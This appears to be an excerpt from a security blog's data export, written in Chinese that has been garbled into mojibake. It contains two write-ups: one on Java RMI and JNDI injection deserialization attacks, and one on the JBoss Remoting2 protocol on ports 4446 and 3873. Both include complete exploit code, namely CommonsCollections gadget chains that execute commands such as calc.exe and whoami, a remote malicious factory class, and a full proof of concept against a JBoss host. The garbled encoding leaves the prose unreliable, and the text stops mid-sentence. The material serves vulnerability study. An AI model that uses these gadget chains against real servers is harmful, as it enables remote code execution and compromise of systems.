æ¡é“¾çœ‹äº†ä¸‹æœ€åéƒ½æ˜¯é€šè¿‡transformæ–¹æ³•åå°„æ‰§è¡Œå‘½ä»¤çš„ï¼Œå°±æ˜¯å…¥å£ç±»å’Œä¸­é—´è¡”æ¥ç±»ä¸ä¸€æ ·ï¼ŒCommonsCollections5ä¹Ÿè·Ÿäº†ä¸‹ï¼Œæ— éœ€åŠ¨æ€ä»£ç†ï¼Œç›¸æ¯”CommonsCollections1æ„é€ èµ·æ¥è¿˜æ›´ç®€å•ã€‚ RMIæ”»å‡»æœåŠ¡ç«¯æ”»å‡»æœåŠ¡ç«¯çš„æ–¹å¼æˆ‘çœ‹åˆ°æœ‰ä¸¤ç§(å¯èƒ½è¿˜æœ‰æ›´å¤šçš„æˆ‘ä¸çŸ¥é“)ï¼Œä¸€ç§æ˜¯è¿œç¨‹æ–¹æ³•çš„å‚æ•°æœ‰é€šè¿‡ç±»å®ä¾‹çš„ï¼Œæ„é€ æ¶æ„çš„å®ä¾‹ä¼ è¿‡å»ï¼›å¦ä¸€ç§æ˜¯ä½¿ç”¨bindæ–¹æ³•æ³¨å†Œç»‘å®šä¸€ä¸ªæ¶æ„çš„å®ä¾‹ã€‚ è¿œç¨‹æ–¹æ³•å‚æ•°æœ‰ç±»å®ä¾‹ ç”±äºRMIä¼ çš„å‚æ•°éƒ½æ˜¯ç»è¿‡åºåˆ—åŒ–çš„ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯é‚£è¾¹å°±ä¼šè¿›è¡Œååºåˆ—åŒ–è¿˜åŸå¯¹è±¡ã€‚è¿™é‡Œæˆ‘å°±æƒ³åˆ°äº†ä¸ªé—®é¢˜ï¼Œå®ç°è¿œç¨‹æ–¹æ³•çš„ç±»æ²¡æœ‰å®ç°Serializableä¸ºä»€ä¹ˆåˆèƒ½è¢«åºåˆ—åŒ–å‘¢ï¼ŸåŸå› å°±åœ¨å®ç°è¿œç¨‹æ–¹æ³•çš„ç±»ç»§æ‰¿çš„UnicastRemoteObjectç±»ä¸Šï¼Œåªè¦ä¸€ç›´å›æº¯ï¼Œä¸éš¾å‘ç°UnicastRemoteObjectçš„æœ€ç»ˆçˆ¶ç±»æ˜¯RemoteObjectï¼Œæ˜¯å®ƒå®ç°äº†Serializableã€‚ ç°åœ¨æˆ‘ä»¬å‚æ•°ä¼ ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ååºåˆ—åŒ–é“¾å°±èƒ½é€ æˆååºåˆ—åŒ–æ¼æ´ï¼Œä½†å¦‚æœè¿™ä¸ªå‚æ•°çš„ç±»ä¸èƒ½ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ç±»çš„è¯ï¼Œæˆ‘ä»¬é€šè¿‡å…¥å£ç±»ç»§æ‰¿åŸæ¥çš„ç±»ï¼Œå®ç°ååºåˆ—åŒ–ä»»æ„ç±»ã€‚è¿™é‡Œè¿˜æ˜¯ä»¥CommonsCollectionsä¸ºä¾‹ï¼Œä½†ä¿®æ”¹CommonsCollectionsåŸæœ‰çš„å…¥å£ç±»æŒºéº»çƒ¦çš„ï¼ŒDemoç®€åŒ–ä¸€ä¸‹ï¼ŒæœåŠ¡ç«¯åˆšå¥½æœ‰ä¸€ä¸ªå®ç°äº†Serializableçš„ç±»ï¼Œç±»é‡Œè¿˜æœ‰ä¸€ä¸ªObjectå±æ€§ã€‚ 123 class Exploit implements Serializable { Object obj;} æœåŠ¡ç«¯è¿œç¨‹æ–¹æ³•çš„å‚æ•°æ˜¯Exceptionç±»ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯çš„Exploitå°±æœ‰ç¨ç¨ä¿®æ”¹ä¸‹ï¼Œç»§æ‰¿Exceptionç±»ã€‚ 123 class Exploit extends Exception implements Serializable { Object obj;} ç„¶åå®¢æˆ·ç«¯å®ä¾‹åŒ–ä¸€ä¸ªExploitå¯¹è±¡ï¼Œè®¾ç½®å®ƒçš„objå±æ€§ä¸ºCommonsCollectionsçš„POPé“¾å³å¯ã€‚ æ”¾ä¸ŠDemoçš„ä»£ç ï¼š 123456789101112 // æœåŠ¡ç«¯RMIServer.java package com.test; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; public class RMIServer { public static void main(String[] args) throws RemoteException, AlreadyBoundException { LocateRegistry.createRegistry(8888).bind(\"method\",new RemoteMethodImpl()); }} 123456789101112131415161718192021222324//æœåŠ¡ç«¯RemoteMethodImpl.javapackage com.test;import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteMethodImpl extends UnicastRemoteObject implements RemoteMethod { protected RemoteMethodImpl() throws RemoteException { } @Override public String read(Exception obj) throws RemoteException { return null; }}class Exploit implements Serializable { private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); } Object obj;} 123456789 //å®¢æˆ·ç«¯æœåŠ¡ç«¯ç›¸åŒRemoteMethod.java package com.test; import java.rmi.Remote;import java.rmi.RemoteException; public interface RemoteMethod extends Remote { public String read(Exception obj) throws RemoteException; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 //å®¢æˆ·ç«¯åˆ©ç”¨ä»£ç  package com.test; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.map.LazyMap; import java.io.Serializable; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.rmi.registry.LocateRegistry; import java.util.*; public class Client { public static void main(String[] args) throws Exception { RemoteMethod remoteMethod = (RemoteMethod) LocateRegistry.getRegistry(8888).lookup(\"method\"); Exploit exploit = new Exploit(); exploit.obj = getPayload(); remoteMethod.read(exploit); } public static Object getPayload() throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); return obj; }} class Exploit implements Serializable { Object obj; } åœ¨è°ƒç”¨æ ˆé‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿œç¨‹æ–¹æ³•çš„å‚æ•°æ˜¯Exceptionç±»ï¼Œååºåˆ—åŒ–çš„å¯¹è±¡å®é™…ä¸Šæ˜¯Exploitã€‚ æ³¨å†Œæ¶æ„å®ä¾‹ å¦‚æœrmiregistryå’ŒæœåŠ¡ç«¯åˆ†å¼€çš„è¯ï¼Œè¿™ç§æƒ…å†µå®é™…æ”»å‡»çš„æ˜¯rmiregistryã€‚rmiregistryåœ¨å°†æ³¨å†Œåå’ŒRomteå¯¹è±¡ç»‘å®šæ—¶ä¼šå°†è¿™ä¸¤ä¸ªå€¼ååºåˆ—åŒ–ï¼Œå¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ååºåˆ—åŒ–POPé“¾ã€‚å¦‚æœè¿™ä¸ªé“¾å…¥å£ç±»æ²¡æœ‰ç»§æ‰¿Remoteç±»ï¼Œå¯ä»¥ä½¿ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼ç”ŸæˆRemoteçš„ä»£ç†ç±»ã€‚ 1234567InvocationHandler obj = (InvocationHandler) getPayload();RemoteMethod remote = (RemoteMethod) Proxy.newProxyInstance( RemoteMethod.class.getClassLoader(), new Class[]{RemoteMethod.class}, obj);LocateRegistry.getRegistry(8888).rebind(\"hack\", remote); ä¸‹æ–­ç‚¹å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–æ“ä½œæ˜¯åœ¨RegistryImpl_Skelç±»çš„dispatchæ–¹æ³•è¿›è¡Œçš„ã€‚ JNDIæ³¨å…¥RMIé™¤äº†ç»‘å®šRemoteå¯¹è±¡ä¹‹å¤–ï¼Œè¿˜å¯ç»‘å®šReferenceWrapperå¯¹è±¡ï¼ŒReferenceWrapperé‡Œçš„Referenceå±æ€§è®°å½•Factoryç±»çš„åç§°ã€åŒ…åå’Œåœ°å€ã€‚å½“InitialContextç±»æˆ–ä»–çš„å­ç±»å¯¹è±¡ç›´æ¥æˆ–é—´æ¥çš„è°ƒç”¨lookupæ–¹æ³•ï¼ŒåŒæ—¶nameå‚æ•°å¯æ§æ—¶ï¼Œä»JNDIæ¥å£è·å–æ”»å‡»è€…çš„Referenceå¯¹è±¡ï¼Œç„¶åä»æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸‹è½½Factoryå¹¶å®ä¾‹åŒ–ï¼Œæ”»å‡»è€…åœ¨é™æ€ä»£ç æˆ–æ„é€ æ–¹æ³•åŠ å…¥æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œå°±èƒ½åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å®ç°å‘½ä»¤æ‰§è¡Œã€‚ æ”¾ä¸ŠDemoä»£ç ï¼š 123456789101112131415161718// RMIServer.javapackage com.test;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.*;public class RMIServer { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(8888); Reference reference = new Reference(\"Exploit2\", \"com.exploit.Exploit2\", \"http://127.0.0.1:8081/\"); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"calc\", wrapper); }} 1234567891011// RMIClinet.javapackage com.test;import javax.naming.*;public class RMIClient { public static void main(String[] args) throws Exception { Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:8888/calc\"); }} æ¶æ„çš„Factoryç±»ï¼š 1234567891011121314151617package com.exploit;import java.io.IOException;class Exploit2 { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } Exploit2() throws Exception { Runtime.getRuntime().exec(\"calc\"); }} åŒæ—¶èµ·ä¸€ä¸ªpythonçš„SimpleHTTPServerï¼Œæ¥ä½œä¸ºFactroyç±»çš„ä¸‹è½½æœåŠ¡ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼Œä¸€å¼€å§‹æˆ‘æ˜¯ç›´æ¥http://127.0.0.1:8081/Exploit2.classä¸‹è½½Factroyç±»ï¼Œåœ¨æµ‹è¯•ä¸­è™½ç„¶å‘èµ·äº†ä¸‹è½½è¯·æ±‚ï¼Œä½†å¹¶æ²¡æœ‰å¼¹è®¡ç®—å™¨ï¼Œä¸€åº¦ä»¥ä¸ºæˆ‘çš„ä»£ç å†™å¾—æœ‰é—®é¢˜ï¼Œå‚è€ƒäº†åˆ«äººçš„Demoä»£ç ï¼ŒfactroyLocationè®¾ç½®çš„æ˜¯ä¸‹è½½æœåŠ¡çš„æ ¹ç›®å½•ï¼Œç”¨SimpleHTTPServeræµ‹è¯•ä¸‹ï¼Œè¯·æ±‚çš„åœ°å€ä¼šå˜ä¸ºhttp://127.0.0.1:8081/com/exploit/Exploit2.classï¼Œæ‰€ä»¥ä¸‹è½½ç›®å½•è¦è·ŸæŠ¥åç›¸åŒæˆ–è€…è¯·æ±‚ä»»æ„åœ°å€éƒ½ä¸‹è½½Factroyæ‰è¡Œã€‚ ä¸‡äº‹ä¿±å¤‡ï¼Œå¼€è°ƒã€‚ å‰ä¸¤ä¸ªlookupæ–¹æ³•éƒ½æ˜¯å¥—å¨ƒè°ƒç”¨ï¼Œç›´æ¥è·Ÿè¿›åˆ°RegistryContextçš„lookupæ–¹æ³•ã€‚ä½¿ç”¨ç»‘å®šçš„ReferenceWrapperå’Œå¯¹åº”çš„Nameè°ƒç”¨decodeObjectæ–¹æ³•ã€‚ è·Ÿè¿›åˆ°decodeObjectæ–¹æ³•ï¼Œè·å–Referenceå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨Referenceå¯¹è±¡å’ŒNameå¯¹è±¡è°ƒç”¨getObjectInstanceæ–¹æ³•ã€‚ 123456private Object decodeObject(Remote var1, Name var2) throws NamingException { try { Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; return NamingManager.getObjectInstance(var3, var2, this, this.environment); ...} getObjectInstanceæ–¹æ³•é‡Œåˆç»§ç»­é€šè¿‡Referenceå¯¹è±¡å’Œfactoryç±»åè°ƒç”¨getObjectFactoryFromReferenceæ–¹æ³•è·å–å¯¹è±¡ã€‚æ¥ç€è·Ÿè¿›getObjectFactoryFromReferenceæ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªåœ°æ–¹è°ƒç”¨loadClassï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆæ˜¯ç¬¬äºŒä¸ªloadClassã€‚ç¬¬ä¸€ä¸ªloadClassæ˜¯ä»å½“å‰classPathè·å–ç±»çš„Classå®ä¾‹ã€‚å¦‚æœæ¶æ„ç±»å’Œå®¢æˆ·ç«¯åŒåœ¨ä¸€ä¸ªé¡¹ç›®ï¼Œéœ€è¦æŠŠæ¶æ„ç±»ç¼–è¯‘åçš„.classæ–‡ä»¶åˆ æ‰æ‰ä¼šä»è¿œç¨‹ä¸‹è½½æ¶æ„ç±»ã€‚åç»­å¦‚clasä¸ºnullï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°æ²¡è¿™ä¸ªfactoryç±»æ—¶ï¼Œè·å–codebaseï¼Œä¹Ÿå°±æ˜¯åˆå§‹åŒ–Referenceæ—¶çš„factoryNameå±æ€§ï¼Œè°ƒç”¨å¦ä¸€ä¸ªloadClassæ–¹æ³•ã€‚ 123456789101112131415161718192021222324static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class&lt;?&gt; clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } è·Ÿè¿›ç¬¬äºŒä¸ªloadClassï¼Œé€šè¿‡URLClassLoaderçš„newInstanceç”Ÿæˆè¿œç¨‹ç±»çš„ClassLoaderï¼Œç„¶åä½¿ç”¨ClassLoaderåå°„ç”Ÿæˆfactoryç±»çš„Classå®ä¾‹ã€‚åœ¨å®ä¾‹åŒ–Classçš„å®ä¾‹çš„æ—¶å€™ï¼Œé™æ€ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚ é™¤äº†RMIï¼ŒLDAPä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼å®ä¾‹åŒ–è¿œç¨‹çš„æ¶æ„ç±»ï¼Œè¿™ä¸¤ç§åˆ©ç”¨æ–¹æ³•éƒ½å†™åœ¨åç»­è¾ƒé«˜çš„Javaç‰ˆæœ¬è¢«é™åˆ¶ä»è¿œç¨‹ä¸‹è½½å¹¶å®ä¾‹åŒ–factoryç±»ã€‚ com.sun.jndi.ldap.object.trustURLCodebase å±æ€§åœ¨ Oracle JDK 11.0.1, 8u191, 7u201, and 6u211åŠä»¥åçš„ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼ä¸ºfalseï¼Œå³ä¸å…è®¸LDAPä»è¿œç¨‹åœ°å€åŠ è½½Referenceå·¥å‚ç±»ã€‚ com.sun.jndi.rmi.object.trustURLCodebase å±æ€§åœ¨ Oracle JDK 8u113, 7u122, 6u132åŠä»¥åçš„ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸RMIä»è¿œç¨‹åœ°å€åŠ è½½Referenceå·¥å‚ç±»ã€‚ åè®°è·å‘å¸ƒä¸Šä¸€ç¯‡æ–‡ç« 24å¤©ï¼Œä½ æ–‡ç« å†™å¿«ç‚¹å§å¤§å“¥ï¼Œç‚’å†·é¥­æè¿™ä¹ˆä¹…ã€‚åç»­å¤ç°ä¸‹ä¸€äº›ç»„ä»¶ã€CMSçš„ååºåˆ—åŒ–æ¼æ´ã€‚ å‚è€ƒhttps://github.com/bit4woo/code2sec.com https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#5-2-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86 https://yoga7xm.top/2019/09/02/rmi/ https://paper.seebug.org/1091/#java-rmi_3 https://paper.seebug.org/1420/#_2 https://www.redteaming.top/2020/08/24/JNDI-Injection/","link":"/2021/08/24/JAVAååºåˆ—åŒ–å­¦ä¹ /"},{"title":"JBoss remoting2åè®®åŠå…¶ååºåˆ—åŒ–åˆ†æ","text":"å‰è¨€å‰æ®µæ—¶é—´è¯»äº†@Y4arå¸ˆå‚…åˆ†æJBossçš„æ–‡ç« å’Œã€ŠA little bit beyong \\xAC\\xEDã€‹çš„åŸæ–‡ï¼Œèµ·åˆç®€å•çš„çœ‹ä¸‹ï¼Œä»¥ä¸ºæ˜¯æ™®é€šçš„ååºåˆ—æ¼æ´ï¼Œåé¢ç»è¿‡åˆ†ææ‰å¯Ÿè§‰æ˜¯å…³äºJBossçš„Remoting2åè®®çš„æ¼æ´ã€‚æœ¬æ–‡ä»¥JBoss AS 6.1.0.Finalä¸ºä¾‹ï¼Œä¸»è¦åˆ†æä¸@Y4arå¸ˆå‚…ç¨æœ‰ä¸åŒçš„ä¸€ç§ååºåˆ—åŒ–è§¦å‘æ–¹å¼ã€‚ Remoting2åè®®RemotingæœåŠ¡ç«¯çš„æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨æ¥å—æ”¶åˆ°ä»ç½‘ç»œä¼ è¾“è¿‡æ¥çš„æ•°æ®åï¼Œæ•°æ®ä¼šç”±UnMarshallerè½¬æ¢è°ƒç”¨è¯·æ±‚å¯¹è±¡ï¼Œä¼ é€åˆ°ServerInvokerï¼Œå†ç”±å…¶æ ¹æ®è°ƒç”¨è¯·æ±‚å¯¹è±¡çš„ä¿¡æ¯ä¼ é€åˆ°ç›¸åº”çš„è°ƒç”¨å®ç°ç±»InvocationHandlerã€‚ InvocationHandleræ‰§è¡Œå®Œçš„è¿”å›ç»“æœï¼Œä¼šç»ç”±ServerInvokerä¼ åˆ°Marshallerï¼Œå†ç”±Marshallerè½¬æ¢ä¸ºç½‘ç»œä¸­ä¼ è¾“çš„æ•°æ®ï¼Œä¼ å›ç»™è°ƒç”¨çš„å®¢æˆ·ç«¯ã€‚ æ¼æ´åˆ†æä»ç²—ç•¥æµè§ˆæ–‡ç« è·å–åˆ°çš„ä¿¡æ¯æ¥çœ‹ï¼Œæ¼æ´å­˜åœ¨äº3873å’Œ4446ç«¯å£ã€‚é‚£ä¹ˆç›´æ¥ä¸‹æ–­ç‚¹åœ¨ServerSocketï¼Œå¾€å‰å›æº¯å‡ å±‚ï¼Œå¯ä»¥çœ‹åˆ°åˆ†åˆ«æ˜¯ç”±org.jboss.remoting.transport.Connector#startæ–¹æ³•å’Œorg.jboss.remoting.transport.socket.SocketServerInvoker#startå¼€å¯çš„ç›‘å¬ç«¯å£ã€‚åœ¨SocketServerInvokerå¯¹è±¡ä¸­çš„propså±æ€§å¯ä»¥çœ‹åˆ°è‡ªå®šä¹‰çš„ç¼–ç ã€è§£ç å·¥å…·ç±»ï¼šInvocationMarshallerå’ŒInvocationUnMarshallerã€‚ åœ¨åç«¯æ¡†æ¶ä¸­Connectorå……å½“ç€ç®¡ç†ServerInvokerçš„è§’è‰²ï¼Œå¹¶ä¸ºServerInvokeræ·»åŠ InvocationHandlerï¼Œå…¶addInvocationHandlerå°±æ˜¯ç”¨æ¥å®ç°è¯¥åŠŸèƒ½çš„ã€‚ 12345678910111213public ServerInvocationHandler addInvocationHandler(String subsystem, final ServerInvocationHandler handler) throws Exception { if (this.invoker == null) { throw new IllegalStateException(\"You may only add handlers once the Connector is created (via create() method).\"); } else { AccessController.doPrivileged(new PrivilegedAction() { public Object run() { handler.setMBeanServer(Connector.this.server); return null; } }); return this.invoker.addInvocationHandler(subsystem, handler); }} ç”¨äºä¾›Remotoingå®¢æˆ·ç«¯è°ƒç”¨çš„ServerInvocationHandlerå®ç°ç±»ä¼—å¤šï¼ŒåŒ…æ‹¬å„ç§å„æ ·åè®®å’Œä½¿ç”¨åœºæ™¯ã€‚ åŸºäºConnectorçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨å…¶addInvocationHandleræ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥å¾—å‡ºJBossæ‰€ä½¿ç”¨åˆ°çš„InvocationHandlerã€‚åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå®æµ‹åªä¼šä½¿ç”¨åˆ°ä»¥ä¸‹äº”ä¸ªServerInvocationHandlerã€‚å…¶ä¸­AOPRemotingInvocationHandlerç±»é…ç½®åœ¨3873ç«¯å£ï¼Œå…¶ä½™å››ä¸ªé…ç½®åœ¨4446ç«¯å£ã€‚ org.jboss.profileservice.remoting.ProfileServiceInvocationHandler org.jboss.aspects.remoting.AOPRemotingInvocationHandler org.jboss.profileservice.management.upload.remoting.DeployHandler org.jboss.invocation.unified.server.UnifiedInvoker org.jboss.deployment.remoting.DeployHandler ä»ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯çš„Demoä»£ç ï¼Œæ²¡æœ‰è®¾ç½®subsystemåç§°ï¼Œé»˜è®¤å°±è¿›åˆ°äº†4446ç«¯å£ä¸‹çš„ç¬¬ä¸€ä¸ªInvocationHandlerã€‚ 123456789101112131415161718192021222324252627import java.net.MalformedURLException; import java.util.HashMap; import org.jboss.remoting.Client; import org.jboss.remoting.InvokerLocator; public class ClientTest { public static void main(String[] args){ String locatorURI = \"socket://192.168.78.132:4446\"; String params = \"/?backlog=50&amp;numAcceptThreads=30&amp;maxPoolSize=30&amp;clientMaxPoolSize=30&amp;clientLeasePeriod=10000&amp;timeout=8000\"; locatorURI += params; try { InvokerLocator locator = new InvokerLocator(locatorURI); Client client = new Client(locator,ServerHandle.class.getName()); client.connect(); client.invoke(\"jhb \",new HashMap&lt;String,String&gt;()); } catch (MalformedURLException e) { e.printStackTrace(); } catch (Exception e) { e.printStackTrace(); } catch (Throwable e) { e.printStackTrace(); } } } è·Ÿè¿›åˆ°org.jboss.deployment.remoting.DeployHandler#invokeæ–¹æ³•ï¼Œå…¶é€»è¾‘æ˜¯ä»InvocationRequestè·å–å‚æ•°å’Œè½½è·ï¼Œå†æ ¹æ®å‚æ•°å€¼è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚å…¶ä¸­å‚æ•°çš„å€¼å°±æ˜¯å®¢æˆ·ç«¯ä¸­è°ƒç”¨invokeæ–¹æ³•ä¼ çš„å€¼ã€‚ æ¥åˆ°InvocationRequestçš„å®šä¹‰å¤„ï¼Œå®ƒå®ç°äº†Serializableï¼Œå¹¶ä¸”getParameterå’ŒgetRequestPayloadæ–¹æ³•è·å–åˆ°çš„å±æ€§çš„ç±»å‹åˆ†åˆ«ä¸ºObjectå’ŒMapã€‚ è¿™é‡Œç›´æ¥åœ¨è°ƒç”¨Clientçš„invokeæ–¹æ³•æ—¶ï¼Œparamæˆ–matedataå‚æ•°ä¼ å…¥CC6çš„å¯¹è±¡ï¼Œå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚åœ¨è°ƒç”¨æ ˆä¸­ä»è‡ªå®šä¹‰çš„è§£ç å·¥å…·ç±»InvocationUnMarshallerå¼€å§‹ï¼Œä¸­é—´æ²¡æœ‰ååºåˆ—åŒ–ç±»é»‘ç™½åå•ç­‰é˜²æŠ¤æªæ–½ï¼Œä¸€è·¯æ¥åˆ°ObjectInputStreamçš„readObjectæ–¹æ³•ååºåˆ—åŒ–è¿˜åŸCC6å¯¹è±¡ã€‚ å¦ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç«¯å£3873ï¼Œè°ƒç”¨æ ˆä¸­ååºåˆ—åŒ–æ˜¯ä»SerializableUnMatshallerå¼€å§‹ï¼Œä½†æœ€ç»ˆè¿‡ç¨‹æ˜¯ä¸€æ ·çš„ã€‚ æœ€ç»ˆå®Œæ•´POCå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class SimpleClient { public static void main(String[] args) throws Throwable { makeInvocation(\"socket://192.168.78.155:4446/\"); } public static void makeInvocation(String locatorURI) throws Throwable { InvokerLocator locator = new InvokerLocator(locatorURI); System.out.println(\"Calling remoting server with locator uri of: \" + locatorURI); Client remotingClient = new Client(locator); HashMap&lt;String,Object&gt; mateMap = new HashMap&lt;&gt;(); mateMap.put(\"test\",ApacheCommonsCollections6.getObject()); remotingClient.connect(); remotingClient.invoke(mateMap); remotingClient.invoke(\"jhb \",mateMap); }}class ApacheCommonsCollections6 { public static Object getObject() throws Exception { Transformer[] realChain = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{ String.class, Class[].class}, new Object[]{ \"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"whoami\"})}; Transformer chain = new ChainedTransformer(realChain); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chain); TiedMapEntry tme = new TiedMapEntry(outermap, \"mykey\"); HashSet hs = new HashSet(1); hs.add(\"diggid\"); Field mapField = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); mapField.setAccessible(true); HashMap hm = (HashMap) mapField.get(hs); Field tableField = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); tableField.setAccessible(true); Object[] tableArray = (Object[]) tableField.get(hm); Object table = tableArray[0]; Field key = table.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(table, tme); return hs; }} éšä¾¿çœ‹çœ‹å‰é¢æœ‰è¯´åˆ°remoting2é™¤äº†socketå¤–ï¼Œè¿˜æ”¯æŒå…¶ä»–ä¸€äº›åè®®ï¼Œä½†é»˜è®¤æ¨¡å¼ä¸‹åŸºäºsocketåè®®çš„remoting2åè®®è¢«ç”¨åˆ°ã€‚ä¸è¿‡å…¶ä¸­çš„WebInvoctonHandlerè¿˜æ˜¯æŒºå¸å¼•äººçš„ã€‚çœ‹äº†JBossçš„æ–‡æ¡£ï¼Œå‘ç°æœ‰å…³äºè¿™ä¸ªInvocationHandlerçš„ä»‹ç»ï¼Œå®ƒå¯ä»¥é€šè¿‡httpåè®®è¿›è¡Œååºåˆ—åŒ–ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class SimpleClient { // Default locator values private static String transport = \"http\"; private static String host = \"localhost\"; private static int port = 5400; public void makeInvocation(String locatorURI) throws Throwable { // create InvokerLocator with the url type string // indicating the target remoting server to call upon. InvokerLocator locator = new InvokerLocator(locatorURI); System.out.println(\"Calling remoting server with locator uri of: \" + locatorURI); Client remotingClient = new Client(locator); // make invocation on remoting server and send complex data object // by default, the remoting http client invoker will use method type of POST, // which is needed when ever sending objects to the server. So no metadata map needs // to be passed to the invoke() method. Object response = remotingClient.invoke(new ComplexObject(2, \"foo\", true), null); System.out.println(\"\\nResponse from remoting http server when making http POST request and sending a complex data object:\\n\" + response); Map metadata = new HashMap(); // set the metadata so remoting client knows to use http GET method type metadata.put(\"TYPE\", \"GET\"); // not actually sending any data to the remoting server, just want to get its response response = remotingClient.invoke((Object) null, metadata); System.out.println(\"\\nResponse from remoting http server when making GET request:\\n\" + response); // now set type back to POST and send a plain text based request metadata.put(\"TYPE\", \"POST\"); response = remotingClient.invoke(WebInvocationHandler.STRING_RETURN_PARAM, metadata); System.out.println(\"\\nResponse from remoting http server when making http POST request and sending a text based request:\\n\" + response); // notice are getting custom response code and message set by web invocation handler Integer responseCode = (Integer) metadata.get(HTTPMetadataConstants.RESPONSE_CODE); String responseMessage = (String) metadata.get(HTTPMetadataConstants.RESPONSE_CODE_MESSAGE); System.out.println(\"Response code from server: \" + responseCode); System.out.println(\"Response message from server: \" + responseMessage); }} è™½ç„¶åœ¨JBossè¿™é‡Œç”¨åˆ°WebInvoctonHandlerï¼Œä½†æ˜¯æ ¹æ®JBossçš„Demoé…ç½®æ–‡ä»¶ç»™å‡ºçš„è·¯å¾„/servlet-invoker/ServerInvokerServletï¼Œå¯ä»¥æŸ¥åˆ°åŸºäºJBosså¼€å‘çš„JBoss Operations Networkå­˜åœ¨å…³äºWebInvoctonHandlerçš„æ¼æ´ï¼ŒCVEç¼–å·ä¸ºCVE-2016-3737ã€‚ åè®°çœ‹äº†JBosså…¶ä»–ååºåˆ—åŒ–æ¼æ´ã€4446å’Œ3873è¿™ä¸¤ä¸ªç«¯å£æ¼æ´ï¼Œæ„Ÿè§‰JBosså°±åƒä¸ªç­›å­ï¼Œç‰¹åˆ«æ˜¯Remotingè¿™ä¸ªåè®®ã€‚åé¢åœ¨JBoss EAP 6.xå’ŒJBoss/Wildfly AS 